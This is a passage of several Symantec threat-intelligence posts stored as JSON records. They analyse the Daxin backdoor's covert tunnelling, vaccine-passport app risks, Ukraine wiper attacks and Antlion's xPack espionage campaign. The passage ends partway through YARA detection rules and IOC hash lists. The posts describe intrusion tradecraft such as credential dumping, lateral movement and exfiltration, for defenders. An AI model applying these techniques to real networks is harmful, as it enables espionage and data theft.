of the malicious communications protocol gained during reverse engineering of the malicious driver, we implemented a rough client to interact with the Daxin backdoor running on “Alice-PC”. We used this client to instruct the backdoor on “Alice-PC” to create a communications channel to “Dave-PC” passing via two intermediate nodes: “Bob-PC” and “Charlie-PC”. The connectivity was established successfully, and we were able to interact with all the infected machines. Finally, we were able to use this malicious network tunnel via “Dave-PC” to communicate with legitimate services on “Clean-PC”. This concludes the first part of our technical analysis of Daxin. In our second, and final blog, we will examine the communications and networking features of the malware. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/daxin-malware-espionage-analysis"
  },
  {
    "title": "covid passport risks",
    "content": "As the world becomes accustomed to living with COVID-19, people are increasingly having to prove they are vaccinated, often via the use of so-called digital vaccine passports containing their identity and vaccination record. Employers, restaurants, even the neighborhood bar are relying on this system to be secure, accurate, and to maintain user privacy. The person using the passport is also expecting the same thing. With a lack of federal guidance or global policy, it has been left up to country, state, or even local municipalities to decide what passes as an \"official\" vaccine passport. Without clear requirements, the private and public sector providers of vaccine passport apps must tackle evaluating a technology and workflow that includes collecting the minimum amount of medical data and personal identifiable information (PII) required to prove vaccination records are legitimate. Symantec, a division ofBroadcom Software, took a look at how these digital vaccine passports work and the potential security risks and threat scenarios they present. A vaccine passport is a paper or digital form certifying a person has been vaccinated against a disease, in this case COVID-19. While paper passports may be used, more often the digital form is used, which may, in some cases, be only a screenshot of the results or picture directly taken of the vaccine card (this may work in some cases, although it lacks authenticity that the results are from the provider and have not been tampered with). Digital vaccination passports have QR codes that contain and connect a user’s encoded health data (a vaccination record from a medical provider) to the vaccinated person's passport app. Issuers of the encoded vaccination data include healthcare providers and government entities. These entities follow one of two standards concerning the structure of the encoded data. The first standard, followed primarily by issuers in the U.S. and Canada, is the SMART Health Card Framework from VCI, a broad coalition of leading healthcare and technology organizations. The second standard, recognized internationally, is the EU Digital COVID Certificate and uses the Electronic Health Certificate Container Format (HCERT). Both standards use QR codes and are very similar as far as data structure, with one key difference as we will see below. The tools, or validation apps, used to decode the vaccination data in the passport app QR codes are readily available. Using one of these tools, we will take a look at the data contained in one of the QR codes, using an example code from California's digital vaccine record system. Note the \"SMART\" logo (Figure 1) identifying it as a SMART Health Card. $  zbarimg qrcode_passport.png --raw --quiet shc:/567629095243206034602924374044603122295953265460346029254077280433602 8702864716745222809286155305564710341432164324111083963210645240371337721 2638633677424237084126633945392929556404425627596537253338446120605736010 645315539723274242843574557440550766267775…. The shc:/ further identifies the SMART Health scheme and the data encodes to a JSON Web Token (JWT). Note that the data is not encrypted, simply encoded. Encoded meaning it may look like just black bars and numbers but decodes directly to the raw vaccination data. Once decoded, we find that the data mainly contains the same data as the paper version of the vaccination record. Specifically, the full set of data, in this example, includes: $ zbarimg qrcode_passport.png --raw --quiet | xargs ./jwt_tool.py --shc JWT Token: eyJ6aXAiOiJERUYiLCJhbGciOiJFUzI1NiIsImtpZCI6IjdKdmt0VXBmMV85TlB3ZE0tNzBGSlQzWWR5VGlT[...]. 3ZLdTuMwEIXfZfY2_ykpzeW[...].YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T [+] kid = \"7JvktUpf1_9NPwdM-70FJT3YdyTiSe2Ivm…\" Token payload values: [+] iss = \"https://myvaccinerecord.cdph.ca.gov/creds\" [+] nbf = 1635982044    ==> TIMESTAMP = 2021-11-03 16:27:24 (UTC) [+] vc = JSON object: [+] type = \"['https://smarthealth.cards#health-card', 'https://smarthealth.cards#immunization', 'https://smarthealth.cards#covid19']\" [+] credentialSubject =  {\"fhirVersion\": \"4.0.1\", \"fhirBundle\": {\"resourceType\": \"Bundle\", \"type\": \"collection\", \"entry\": [{\"fullUrl\": \"resource:0\", \"resource\": {\"resourceType\": \"Patient\", \"name\": [{\"family\": \"Doe\", \"given\": [\"John\"]}], \"birthDate\": \"1980-01-01\"}}, {\"fullUrl\": \"resource:1\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-03-01\", \"lotNumber\": \"EN6208\"}}, {\"fullUrl\": \"resource:2\", \"resource\": {\"resourceType\": \"Immunization\", \"status\": \"completed\", \"vaccineCode\": {\"coding\": [{\"system\": \"http://hl7.org/fhir/sid/cvx\", \"code\": \"208\"}]}, \"patient\": {\"reference\": \"resource:0\"}, \"occurrenceDateTime\": \"2021-04-01\", \"lotNumber\": \"ER8737\"}}]}}}} YCeST7-YDMawwowswFx1R_TYg_5mDVsrSXqNLckdqCY5eNriEoUaSBSu7sCF8T It is important to note that anyone with the QR code can decode this information, as it is not encrypted. The same data can be used to copy and generate the same QR code. The signature, on the other hand, can be used to verify that the passport has not been changed or tampered with and that it came from the issuer, in this case the State of California. By providing the signature and sharing the public key, anyone can verify the vaccine passport has not been tampered with and is from the issuer. Internationally, QR code vaccination records use the Electronic Health Certificate Container Format (HCERT). Similar to the SMART Health Card, the QR image contains a header, payload, and signature. The payload contains mostly the same vaccination record data - name, date of birth, vaccination record, and dates. The signature is also used to validate the authenticity of the digital vaccination record. However, the difference is in the header. SMART Health Cards contain a link/URL to the issuer in the header, which contains the public key used to validate the authenticity of the record using the signature. HCERT QR codes only contain the name of the issuer in the header, and it is up to the verifier app to find and store the public key from the issuer. What are the actual data privacy risks associated with digital vaccine passports? At a minimum, the personal data they contain includes the person's name, date of birth, and vaccine status. This data may be considered medical data and, if exposed, poses a risk if obtained by scammers, who may use it for targeted phishing attacks. Another, and arguably greater and potentially graver risk, is the validity and accuracy of the vaccine passport. Similar to traditional passports, counterfeiting or tampering with the results may in some jurisdictions result in criminal penalties. Therefore, the technology to identify digital vaccine passports must securely and accurately identify their validity and ensure the results have not been tampered with. Otherwise, people may be exposed to the virus and this could come with deadly consequences. We analyzed 40 digital vaccine passport apps and 10 validation apps. The apps we examined were from government entities and regional health providers in multiple countries around the world. Digital vaccine passports are commonly stored on a person's mobile device inside a digital wallet. This provides the convenience of being able to quickly and easily open and show vaccination records when requested. If done right, the person can be confident the data is accurate and secure. Not done right, and the vaccination record can potentially be read by an attacker, either via a network attack or a malicious app on the user’s mobile device. Note that our app analysis focused on publicly available mobile apps used to store vaccination records. Apple and Google also provide storage and retrieval for vaccine passports - Apple via the Health App and Google via Google Wallet - and while our findings for these solutions didn't raise any security flags, it is important to note that both rely on app sandbox protection and sharing permissions to protect vaccination records. This means that if the mobile device is compromised by an attacker, or if the user is tricked into sharing the health data, all bets are off. Wallets that store data in the cloud may expose the user’s vaccination records by including hardcoded cloud credentials inside the app. During our analysis we also found wallets containing hardcoded cloud credentials, potentially exposing sensitive users’ data. Vaccine records may also be exposed if the digital wallet app transfers data from the cloud unencrypted or insecurely. In addition, vaccine records may be exposed if the user unknowingly shares the health data to other apps on their device, or if the vaccine records are stored insecurely on the device. Knowing these threat scenarios, we analyzed the apps looking for risky behaviors that include: Out of the 40 digital passport wallet apps analyzed, 27 exhibited at least one of these risky behaviors. To verify that a vaccine passport is legitimate, validation apps exist that decode the data in the QR code and flag if the vaccination record has been tampered with. As we saw when decoding the example QR code, a signature is contained inside the record that can be used to verify that the record is from the issuer and has not been tampered with. How do we know the QR code is from a specific health provider or issuer? Also inside the QR code is the link to the public key used to sign the record, which is then used to validate the signature. Anyone can create a QR code and put in their own issuer links, therefore a validation app must show and/or whitelist only approved issuers. Otherwise, anyone could use a fake state or medical named issuer URL with fake vaccination record data and the validation app would blindly pass the person. This type of flaw wasfound in the Quebec Vaxicode Verif app in late 2021. When transferring the public key from the issuer or health provider, the URL must be securely accessed and transferred to the mobile device running the app. If the validation app insecurely accesses the URL, an attacker may change the public key and \"pass\" their fake vaccination record. Or, even more deviously, change it to selectively fail other vaccination records. Often validation apps also store the digital vaccine records, either locally or in the cloud. If that is the case, which ideally it shouldn't be, the validation apps are subject to the same risks and threat scenarios as digital wallet apps. Knowing this, we looked for the same previously listed risky behaviors in seven validation apps available at the time of this report and found all of them to be safe. That being said, we will continue to scan new versions of those apps, as well as new validation apps, as they appear on our customers' mobile devices. This is yet another reminder to always be vigilant of apps claiming to protect your privacy and identity, including digital passport wallets. Only give apps permission to private data that they require, nothing more. Whenever possible, avoid third-party apps claiming to securely store your vaccination records and instead use digital wallet solutions provided by the major mobile platforms, such as the Apple Health app and Google Wallet. App developers should only collect and access the user data required to provide the service to the user. Developers should also understand and implement best security practices that protect the users’ private data in the cloud, in transit, and on device. Anything less may compromise your users’ privacy, expose personal medical data, and potentially undermine the legitimacy of their vaccination records entirely. Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/covid-passport-risks"
  },
  {
    "title": "daxin backdoor espionage",
    "content": "New research by the Symantec Threat Hunter team, part of Broadcom Software, has uncovered a highly sophisticated piece of malware being used by China-linked threat actors, exhibiting technical complexity previously unseen by such actors.  The malware appears to be used in a long-running espionage campaign against select governments and other critical infrastructure targets. There is strong evidence to suggest the malware, Backdoor.Daxin, which allows the attacker to perform various communications and data-gathering operations on the infected computer, has been used as recently as November 2021 by attackers linked to China. Most of the targets appear to be organizations and governments of strategic interest to China. In addition, other tools associated with Chinese espionage actors were found on some of the same computers where Daxin was deployed. Daxin is without doubt the most advanced piece of malware Symantec researchers have seen used by a China-linked actor. Considering its capabilities and the nature of its deployed attacks, Daxin appears to be optimized for use against hardened targets, allowing the attackers to burrow deep into a target’s network and exfiltrate data without raising suspicions. Through Broadcom’s membership in the Joint Cyber Defense Collaborative (JCDC), Symantec researchersworked with the Cyber Security and Infrastructure Security Agency (CISA) to engage with multiple foreign governments targeted with Daxinand assisted in detection and remediation. This is the first in a series of blogs. This blog provides an overview of Daxin’s capabilities and will be followed with additional blogs providing further in-depth analysis. As described in more detail below, Daxin comes in the form of a Windows kernel driver, a relatively rare format for malware nowadays. It implements advanced communications functionality, which both provides a high degree of stealth and permits the attackers to communicate with infected computers on highly secured networks, where direct internet connectivity is not available. These features are reminiscent of Regin,an advanced espionage tool discovered by Symantec in 2014that others have linked to Western intelligence services. Daxin’s capabilities suggest the attackers invested significant effort into developing communication techniques that can blend in unseen with normal network traffic on the target’s network. Specifically, the malware avoids starting its own network services. Instead, it can abuse any legitimate services already running on the infected computers. Daxin is also capable of relaying its communications across a network of infected computers within the attacked organization. The attackers can select an arbitrary path across infected computers and send a single command that instructs these computers to establish requested connectivity. This use case has been optimized by Daxin’s designers. Daxin also features network tunneling, allowing attackers to communicate with legitimate services on the victim’s network that can be reached from any infected computer. Daxin is a backdoor that allows the attacker to perform various operations on the infected computer such as reading and writing arbitrary files. The attacker can also start arbitrary processes and interact with them. While the set of operations recognized by Daxin is quite narrow, its real value to attackers lies in its stealth and communications capabilities. Daxin is capable of communicating by hijacking legitimate TCP/IP connections. In order to do so, it monitors all incoming TCP traffic for certain patterns. Whenever any of these patterns are detected, Daxin disconnects the legitimate recipient and takes over the connection. It then performs a custom key exchange with the remote peer, where two sides follow complementary steps. The malware can be both the initiator and the target of a key exchange. A successful key exchange opens an encrypted communication channel for receiving commands and sending responses. Daxin’s use of hijacked TCP connections affords a high degree of stealth to its communications and helps to establish connectivity on networks with strict firewall rules. It may also lower the risk of discovery by SOC analysts monitoring for network anomalies. Daxin’s built-in functionality can be augmented by deploying additional components on the infected computer. Daxin provides a dedicated communication mechanism for such components by implementing a device named “\\\\.\\Tcp4”. The malicious components can open this device to register themselves for communication. Each of the components can associate a 32-bit service identifier with the opened \\\\.\\Tcp4 handle. The remote attacker is then able to communicate with selected components by specifying a matching service identified when sending messages of a certain type. The driver also includes a mechanism to send back any responses. There are also dedicated messages that encapsulate raw network packets to be transmitted via the local network adapter. Daxin then tracks network flows, such that any response packets are captured and forwarded to the remote attacker. This allows the attacker to establish communication with legitimate services that are reachable from the infected machine on the target’s network, where the remote attacker uses network tunnels to interact with internal servers of interest. Perhaps the most interesting functionality is the ability to create a new communications channel across multiple infected computers, where the list of nodes is provided by the attacker in a single command. For each node, the message includes all the details required to establish communication, specifically the node IP address, its TCP port number, and the credentials to use during custom key exchange. When Daxin receives this message, it picks the next node from the list. Then it uses its own TCP/IP stack to connect to the TCP server listed in the selected entry. Once connected, Daxin starts the initiator side protocol. If the peer computer is infected with Daxin, this results in opening a new encrypted communication channel. An updated copy of the original message is then sent over this new channel, where the position of the next node to use is incremented. The process then repeats for the remaining nodes on the list. While it is not uncommon for attackers’ communications to make multiple hops across networks in order to get around firewalls and generally avoid raising suspicions, this is usually done step-by-step, such that each hop requires a separate action. However, in the case of Daxin, this process is a single operation, suggesting the malware is designed for attacks on well-guarded networks, where attackers may need to periodically reconnect into compromised computers. The Symantec Threat Hunter team has identified Daxin deployments in government organizations as well as entities in the telecommunications, transportation, and manufacturing sectors. Several of these victims were identified with the assistance of the PwC Threat Intelligence team. While the most recent known attacks involving Daxin occurred in November 2021, the earliest known sample of the malware dates from 2013 and included all of the advanced features seen in the most recent variants, with a large part of the codebase having already been fully developed. This suggests that the attackers were already well established by 2013, with Daxin features reflecting their expertise at that time. We believe that before commencing development of Daxin, the attackers were already experimenting for some time with the techniques that become part of Daxin. An older piece of malware – Backdoor.Zala (aka Exforel) – contained a number of common features but did not have many of Daxin’s advanced capabilities. Daxin appears to build on Zala’s networking techniques, reusing a significant amount of distinctive code and even sharing certain magic constants. This is in addition to a certain public library used to perform hooking that is also common between some variants of Daxin and Zala. The extensive sharing indicates that Daxin designers at least had access to Zala’s codebase. We believe that both malware families were used by the same actor, which became active no later than 2009. There are several examples of attacks where tools known to be associated with Chinese espionage actors have been observed along with what we believe to be variants of Daxin. In a November 2019 attack against an information technology company, the attackers used a single PsExec session to first attempt to deploy Daxin before then resorting to Trojan.Owprox. Owprox is associated with the China-linked Slug (aka Owlproxy). In May 2020, malicious activity involving both Backdoor.Daxin and Trojan.Owprox occurred on a single computer belonging to another organizations, a technology company. In a July 2020 attack against a military target, the attackers made two unsuccessful attempts to deploy a suspicious driver. When these attempts failed, the attackers resorted to different malware instead, a variant of Trojan.Emulov. Symantec did not obtain either of the two suspicious drivers used in this attack. However, very strong similarities between this attack and earlier activity in which Daxin was used suggests that it is highly likely the attackers attempted to deploy Daxin before falling back on the other malware. In summary, Daxin includes some of the most complex features we have seen in a highly probable China-linked malware campaign. We will publish follow-up blogs over the coming days with more detailed technical analysis and other insights from our research and collaborations. For the latest protection updates, please visit theSymantec Protection Bulletin. Malware related to Daxin activity: 81c7bb39100d358f8286da5e9aa838606c98dfcc263e9a82ed91cd438cb130d1 Backdoor.Daxin (32-bit core) 06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4 Backdoor.Daxin (64-bit core) 0f82947b2429063734c46c34fb03b4fa31050e49c27af15283d335ea22fe0555 Backdoor.Daxin (64-bit core) 3e7724cb963ad5872af9cfb93d01abf7cd9b07f47773360ad0501592848992f4 Backdoor.Daxin (64-bit core) 447c3c5ac9679be0a85b3df46ec5ee924f4fbd8d53093125fd21de0bff1d2aad Backdoor.Daxin (64-bit core) 49c827cf48efb122a9d6fd87b426482b7496ccd4a2dbca31ebbf6b2b80c98530 Backdoor.Daxin (64-bit core) 5bc3994612624da168750455b363f2964e1861dba4f1c305df01b970ac02a7ae Backdoor.Daxin (64-bit core) 5c1585b1a1c956c7755429544f3596515dfdf928373620c51b0606a520c6245a Backdoor.Daxin (64-bit core) 6908ebf52eb19c6719a0b508d1e2128f198d10441551cbfb9f4031d382f5229f Backdoor.Daxin (64-bit core) 7867ba973234b99875a9f5138a074798b8d5c65290e365e09981cceb06385c54 Backdoor.Daxin (64-bit core) 7a08d1417ca056da3a656f0b7c9cf6cd863f9b1005996d083a0fc38d292b52e9 Backdoor.Daxin (64-bit core) 8d9a2363b757d3f127b9c6ed8f7b8b018e652369bc070aa3500b3a978feaa6ce Backdoor.Daxin (64-bit core) b0eb4d999e4e0e7c2e33ff081e847c87b49940eb24a9e0794c6aa9516832c427 Backdoor.Daxin (64-bit core) b9dad0131c51e2645e761b74a71ebad2bf175645fa9f42a4ab0e6921b83306e3 Backdoor.Daxin (64-bit core) cf00e7cc04af3f7c95f2b35a6f3432bef990238e1fa6f312faf64a50d495630a Backdoor.Daxin (64-bit core) e7af7bcb86bd6bab1835f610671c3921441965a839673ac34444cf0ce7b2164e Backdoor.Daxin (64-bit core) ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef Backdoor.Daxin (64-bit core) 08dc602721c17d58a4bc0c74f64a7920086f776965e7866f68d1676eb5e7951f Backdoor.Daxin (dropper) 53d23faf8da5791578c2f5e236e79969289a7bba04eee2db25f9791b33209631 Backdoor.Daxin (dropper) 7a7e8df7173387aec593e4fe2b45520ea3156c5f810d2bb1b2784efd1c922376 Backdoor.Zala (32-bit core) 8dafe5f3d0527b66f6857559e3c81872699003e0f2ffda9202a1b5e29db2002e Backdoor.Zala (32-bit core) 96bf3ee7c6673b69c6aa173bb44e21fa636b1c2c73f4356a7599c121284a51cc Backdoor.Trojan (32-bit core) 9c2f3e9811f7d0c7463eaa1ee6f39c23f902f3797b80891590b43bbe0fdf0e51 Backdoor.Trojan (32-bit core) c0d88db11d0f529754d290ed5f4c34b4dba8c4f2e5c4148866daabeab0d25f9c Backdoor.Trojan (32-bit core) e6a7b0bc01a627a7d0ffb07faddb3a4dd96b6f5208ac26107bdaeb3ab1ec8217 Backdoor.Trojan (32-bit core) File names attributed to Daxin activity: \"ndislan_win2008_x64.sys\" \"performanceaudit.sys\" \"[CSIDL_SYSTEM]\\drivers\\pagefile.sys\" \"[CSIDL_SYSTEM]\\spool\\drivers\\ntds.sys\" Malware observed during overlapping activities: 705be833bd1880924c99ec9cf1bd0fcf9714ae0cec7fd184db051d49824cbbf4 suspected Backdoor.Daxin c791c007c8c97196c657ac8ba25651e7be607565ae0946742a533af697a61878 suspected Backdoor.Daxin 514d389ce87481fe1fc6549a090acf0da013b897e282ff2ef26f783bd5355a01 Trojan.Emulov (core) 1a5c23a7736b60c14dc50bf9e802db3fcd5b6c93682bc40141d6794ae96138d3 Trojan.Emulov (dropper) a0ac5f7d41e9801b531f8ca333c31021c5e064f13699dbd72f3dfd429f19bb26 Trojan.Owprox (core) aa7047a3017190c66568814eb70483bf74c1163fb4ec1c515c1de29df18e26d7 Trojan.Owprox (dropper) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/daxin-backdoor-espionage"
  },
  {
    "title": "ukraine wiper malware russia",
    "content": "UPDATE February 24, 2022, 13:42:This blog has been updated with details about ransomware being used as a possible decoy during some wiper attacks. UPDATE February 25, 2022, 17:00:This blog has been updated with details on how a known Microsoft SQL Server  vulnerability (CVE-2021-1636) was exploited in at least one attack. A new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division ofBroadcom Software, has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors. Trojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper Once run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities. Initial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to potentially related malicious activity beginning as early as November 2021. However, we are continuing to review and verify findings. In the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed by credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23. An organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers may have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was used to download a JPEG file from an internal server, on the victim’s network. A minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on a Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task. Nine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time instead. Beginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform the following: Following this activity, PowerShell was used to dump credentials from the compromised machine: Later, following the above activity, several unknown PowerShell scripts were executed. Five minutes later, the wiper (Trojan.KillDisk) was deployed. The attackers appear to have used an exploit of a known vulnerability in Microsoft SQL Server (CVE-2021-1636) in order to compromise at least one of the targeted organisations. In an attack against an organization in Ukraine, the following process lineage was used to execute the “whoami” command on November 11 2021: The next day, the same process lineage was responsible for executing the following PowerShell command: The organization was running an unpatched version of Microsoft SQL Server. In several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations at the same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names used by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe.  It appears likely that the ransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware. With an invasion now underway, there remains a high likelihood of further cyber attacks against Ukraine and other countries in the region. Symantec’s Threat Hunter Team will continue to actively monitor the situation and post updates to this blog if new information becomes available. Symantec Endpoint products will detect and block this threat using the following signatures: For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ukraine-wiper-malware-russia"
  },
  {
    "title": "china apt antlion taiwan financial attacks",
    "content": "Chinese state-backed advanced persistent threat (APT) group Antlion has been targeting financial institutions in Taiwan in a persistent campaign over the course of at least 18 months. The attackers deployed a custom backdoor we have called xPack on compromised systems, which gave them extensive access to victim machines. The backdoor allowed the attackers to run WMI commands remotely, while there is also evidence that they leveraged EternalBlue exploits in the backdoor. The attackers appeared to have the ability to interact with SMB shares, and it's possible that they used mounted shares over SMB to transfer files from attacker-controlled infrastructure. There is also evidence that the attackers were able to browse the web through the backdoor, likely using it as a proxy to mask their IP address. The goal of this campaign appears to have been espionage, as we saw the attackers exfiltrating data and staging data for exfiltration from infected networks. As well as the attack on the financial institution outlined in thecase study below, Antlion compromised the networks of at least two other organizations in Taiwan, including another financial organization and a manufacturing company. The activity the group carried out on those networks was largely similar to the activity that is detailed in the case study, with the xPack backdoor frequently deployed and a lot of evidence of credential dumping. In the manufacturing target, also, we see the attackers attempting to download malicious files via SMB shares. The attackers also spent a significant amount of time on both these targeted networks, spending close to 250 days on the financial organization and around 175 days on the manufacturing organization. Symantec, a division of Broadcom, cannot state with certainty what the initial infection vector used by the attackers in this campaign was, though in one instance they were seen utilizing the MSSQL service to execute system commands, which indicates that the most likely infection vector was exploitation of a web application or service. However, Antlion are also known to have previously used malicious emails to gain initial access to victim networks. The main custom backdoor used by Antlion in this campaign was the xPack backdoor, which is a custom .NET loader that decrypts (AES), loads, and executes accompanying .bin files. Its decryption password is provided as a command-line argument (Base64 encoded string), and xPack is intended to be run as a standalone application or as a service (xPackSvc variant). The xPack malware and its associated payload seems to be used for initial access; it appears that xPack was predominantly used to execute system commands, drop subsequent malware and tools, and stage data for exfiltration. The attackers also used a custom keylogger and three custom loaders. The attackers also used a custom SMB session enumeration tool (NetSessionEnum), a custom bind/reverse file transfer tool named ENCODE MMC, and a Kerberos golden ticket tool based on Mimikatz. The attackers also used a variety of off-the-shelf tools, as well as leveraging living-off-the-land tools such as PowerShell, WMIC, ProcDump, LSASS, and PsExec. The legitimate AnyDesk tool was also abused by the attackers for remote access in one of the victim organizations. The attackers were also observed leveraging exploits such as CVE-2019-1458 for privilege escalation and remote scheduled tasks to execute their backdoor. CVE-2019-1458 is an elevation-of-privilege vulnerability that occurs in Windows when the Win32k component fails to properly handle objects in memory. Legitimate versions of WinRAR appear to have been exploited by the attackers for data exfiltration, while there is also evidence of data exfiltration via PowerShell, specifically using the BitsTransfer module to initiate an upload to attacker-controlled infrastructure. There is also evidence that the attackers likely automated the data collection process via batch scripts, while there is also evidence of instances where data was likely staged for further exfiltration, though it was not actually observed being exfiltrated from the network. In these instances, it appears the attackers were interested in collecting information from software pertaining to business contacts, investments, and smart card readers. The attackers spent a significant amount of time on victims’ networks, and deployed both custom and off-the-shelf malware. In one financial sector victim in Taiwan the attackers spent almost nine months on the victim network. The first suspicious activity on this victim network occurred in December 2020 when WMIC was used to execute two commands: The first command was used to list the computer name, description of processes, executable path, and process ID. The output was written to a suspicious file named htable.xsl under the wbem directory. The second command was used to collect information about the system, which was written out to the same file (htable.xsl). Information collected included: Five minutes after those commands were issued, WMIC was used to dump credentials: The commands listed above were all executed via Antlion’s custom xPack backdoor. Several days later, during the Christmas holiday period, the attackers returned over a period of a few days and executed the xPack backdoor again. They also executed an unknown VBS script via PsExec multiple times: On December 28, the attackers used xPack to launch a command prompt to dump credentials from several machines within the compromised organization with the following commands: Over the following couple of weeks, the attackers continued to return intermittently to launch the xPack backdoor or to dump credentials via the registry. Then, following a few weeks of inactivity, they become active on the infected network once again. The attackers used the xPack backdoor to launch a command prompt to execute the following commands: The above commands were used to firstly change the code page to 950, which is the Windows code page for Traditional Chinese. The attackers then executed 'query user' to list any logged-in users on the system, as well as running ‘tasklist’ to get a list of all the running processes on the system. They also tried to discover what processes were running, before listing all contents of the Desktop directory and the Users directory. After this, the attackers dumped credentials again via the registry. The attackers returned to the network a couple of weeks later and carried out largely the same activity. The attackers remained active on the network for March, April, and May 2021, intermittently returning to launch their xPack backdoor or dump credentials from the registry. Dumping credentials appears to be a main focus of the attackers, with them likely using these credentials to move laterally across the network to identify machines of interest from which they can exfiltrate data. The last activity on this network, after a gap of three months, occurred in August 2021, when the attackers returned and listed all available shares. They then dumped credentials from the registry and proceeded to collect account, group, and workstation configuration information. They then dumped credentials from the registry once again. This was the last activity seen on this network. Antlion is believed to have been involved in espionage activities since at least 2011, and this recent activity shows that it is still an actor to be aware of more than 10 years after it first appeared. The length of time that Antlion was able to spend on victim networks is notable, with the group able to spend several months on victim networks, affording plenty of time to seek out and exfiltrate potentially sensitive information from infected organizations. The targeting of Taiwan is perhaps unsurprising given we know Chinese state-backed groups tend to be interested in organizations in that region. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. author = \"Symantec, a division of Broadcom\" hash = \"12425edb2c50eac79f06bf228cb2dd77bb1e847c4c4a2049c91e0c5b345df5f2\" $s1 = \"Length or Hash destoryed\" wide fullword $s2 = \"tag unmatched\" wide fullword $s3 = \"File size mismatch\" wide fullword $s4 = \"DESFile\" wide fullword $p1 = \"fomsal.Properties.Resources.resources\" wide fullword $p2 = \"xPack.Properties.Resources.resources\" wide fullword $p3 = \"foslta.Properties.Resources.resources\" wide fullword uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($s*) or any of ($p*)) author = \"Symantec, a division of Broadcom\" hash = \"390460900c318a9a5c9026208f9486af58b149d2ba98069007218973a6b0df66\" $s1 = \"C:\\\\Windows\\\\inf\\\\wdnvsc.inf\" wide fullword $s2 = \"PackService\" wide fullword $s3 = \"xPackSvc\" wide fullword $s4 = \"eG#!&5h8V$\" wide fullword uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of them author = \"Symantec, a division of Broadcom\" hash = \"e968e0d7e62fbc36ad95bc7b140cf7c32cd0f02fd6f4f914eeb7c7b87528cfe2\" hash = \"2a541a06929dd7d18ddbae2cb23d5455d0666af7bdcdf45b498d1130a8434632\" $s1 = {45 00 00 00 48 00 00 00 41 00 00 00 47 00 00 00 42 00 00 00 50 00 00 00 53 00 00 00 4C} // EHAGBPSL $s2 = {74 00 00 00 61 00 00 00 72 00 00 00 57 00 00 00 6F 00 00 00 6B} // tarWok $b1 = \"bnRtZ3M=\" fullword // ntmgs $b2 = \"TmV0d29yayBNYW5hZ2VtZW50IFNlcnZpY2U=\" fullword // Network Management Service $b3 = \"UHJvdmlkZXMgYWJpbGl0eSB0byBtYW5hZ2UgbmV0d29yayBvdmVyIHRoZSBuZXQgcHJvdG9jb2wu\" fullword // Provides ability to manage network over the net protocol. $b4 = \"bnRtZ3MuZG\" // ntmgs.dll / ntmgs.dat $b5 = \"aW1nMS5qcGc=\" fullword // img1.jpg $c1 = \"Wscms.nls\" fullword $c2 = \"Wscms.dat\" fullword $c3 = \"Wscms.dll\" fullword $c4 = \"Wscms.ini\" fullword $c5 = \"Images01.jpg\" fullword $e1 = \"StartWork\" fullword $e2 = \"ServiceMain\" fullword $h1 = {DD 9C BD 72} // CreateRemoteThread $h2 = {C0 97 E2 EF} // OpenProcess $h3 = {32 6D C7 D5} // RegisterServiceCtrlHandlerA $h4 = {A1 6A 3D D8} // WriteProcessMemory uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($e*) and (all of ($s*) or any of ($b*) or 3 of ($c*) or all of ($h*)) author = \"Symantec, a division of Broadcom\" hash = 